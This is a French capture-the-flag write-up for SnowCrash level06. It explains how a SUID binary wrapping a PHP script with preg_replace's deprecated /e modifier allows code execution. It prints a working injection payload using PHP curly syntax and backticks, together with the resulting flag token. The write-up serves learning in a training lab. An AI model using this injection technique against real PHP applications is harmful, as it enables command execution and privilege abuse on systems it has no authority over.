# LEVEL06

Le système de fichier se présente de cette manière:

``` bash
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

On y découvre un script en php et un executable `level06`.
L'executable a des ACL qui precisent que l'utilisateur level06 a les droits de lecture et d'execution sur le fichier. Mais comme le bit SUID est activé, l'utilisateur level06 peut exécuter le programme avec les droits de flag06.

``` bash
level06@SnowCrash:~$ getfacl level06
# file: level06
# owner: flag06
# group: level06
# flags: s--
user::rwx
group::---
group:level06:r-x
mask::r-x
other::---

```

Les scripts php sont géneralement utilisés pour le developpement web mais aussi dans la manipulation d'un systeme de fichiers, la gestion de sessions utilisateur, ...
particularite: script execute sur le serveur et genere HTML envoye au client.
Ici le php est utilisé en CLI (Command Line Interface).

L'exécutable en php lit l'interprète .php pour exécuter les instructions.


``` php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
La partie critique ici concerne `$a = file_get_contents($y)` et `preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)`.

La fonction `file_get_contents()` prend le premier argument passé en parametre (`$argv[1]`, passé à la fonction `x` en tant que `$y`), elle permet de récupérer le contenu du fichier.
La fonction `preg_replace()` va chercher dans le contenu du fichier en question, elle permet de lire des expressions en REGEX, la faille se trouve avec le flag `\e` (`eval()`) qui va considérer le texte de remplacement comme une instruction en php, on va donc pouvoir y glisser une commande système. On appelle `\e` le Deprecated Regex Eval Modifier (il a été supprimé à partir de PHP 7.0 justement  cause de cette faille).

On comprend donc que l'on va devoir créer un fichier dans lequel on retrouvera le motif `/(\[x (.*)\])/e` et l'instruction système `getflag`.
- `/`: délimiteurs de début et de fin d'expression;
- `\[x` :  littéralement `[x`;
- `(.*)` : groupe de capure, le `.` signifie n'importe quel caractère et `*` signifie "0, 1 ou plusieurs fois", c'est ici que sera stocké le texte que nous voulons manipuler;
- `\]` : littéralement `]`;
- `()` : les parenthèses autour de toute expression forment le premier groupe de capture;
- `/e` : modificateur "eval".

Il faut donc insérer l'instruction à exécuter dans `[x ]`

Pour exécuter l'instruction on utilise la "Complex (curly) syntax" de PHP `${expr}`.

La Complex curly syntax est utilisée pour l'interpolation de variable. C'est à dire qu'elle permet d'inclure directement des variables dans des chaines de caractères sans avoir à les concaténer séparément. PHP va d'abord évaluer ce qui est à l'intérieur des accolades pour déterminer le nom de la variable à afficher. En y mettant des backticks (``), on force PHP à exécuter la commande système pour obtenir ce nom.

``` bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```